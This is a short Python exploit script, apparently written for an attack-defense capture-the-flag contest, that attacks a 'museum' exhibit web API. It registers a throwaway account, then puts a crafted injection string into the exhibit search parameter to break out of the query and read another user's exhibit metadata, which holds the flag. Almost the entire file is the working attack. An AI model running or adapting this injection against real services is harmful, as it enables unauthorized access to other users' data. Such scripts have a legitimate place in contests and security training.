#!/usr/bin/env python3

import sys
import requests
import json

IP = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = sys.argv[2] if len(sys.argv) > 1 else 6969
# PORT = 20003
# PUBLIC_FLAG_ID = sys.argv[2] if len(sys.argv[2]) > 2 else ""

def main():
    api_url = f"http://{IP}:{PORT}/api"
    museum_id_list = requests.get(f"http://{IP}:{PORT}/api/museums").text
    museums = json.loads(museum_id_list)['museum_id_list']
    for museum_id in museums:
      print(museum_id)
      exhibit = json.loads(requests.get(f"http://{IP}:{PORT}/api/museums/{museum_id}").text)
      print(exhibit)
      # public_flag_id = json.loads(PUBLIC_FLAG_ID)
      public_flag_id = {
        "exhibit_id": "81740ff7-7e1a-11ee-b550-0242ac130002",
        "museum_id": "82f7eeec-1e67-4762-8530-e26d90dac111"
      }
      museum_id, exhibit_id = public_flag_id["museum_id"], public_flag_id["exhibit_id"]

      hacker_token = requests.post(
          f"{api_url}/register",
          json={"name": "cook", "password": "cooking123"}
      ).json()["token"]

      injection_search = f"' AND id = '{exhibit_id}') AT DATABASE ({museum_id})"
      # also can extract all someone else exhibits
      
      # print(hacker_token)

      resp = requests.get(
          f"{api_url}/museum/exhibits?search={injection_search}",
          headers={"token": hacker_token},
      ).json()
      print(resp)
      print(resp["exhibits"][0]["metadata"])


if __name__ == '__main__':
    main()
